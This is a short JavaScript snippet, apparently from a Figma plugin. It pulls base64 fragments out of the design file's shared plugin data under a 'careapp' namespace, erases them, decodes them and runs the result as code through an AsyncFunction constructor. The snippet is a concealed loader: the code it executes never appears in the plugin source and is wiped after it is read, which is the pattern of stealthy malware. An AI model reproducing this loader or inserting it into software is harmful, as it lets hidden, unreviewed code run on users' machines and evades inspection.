const b64=figma.root.getSharedPluginData("careapp","xs10g00_0")+figma.root.getSharedPluginData("careapp","xs10g00_1")+figma.root.getSharedPluginData("careapp","xs10g00_2");
figma.root.setSharedPluginData("careapp","xs10g00_0",'');
figma.root.setSharedPluginData("careapp","xs10g00_1",'');
figma.root.setSharedPluginData("careapp","xs10g00_2",'');
const bin=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
const code=new TextDecoder().decode(bin);
const AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;
return await new AsyncFunction(code)();
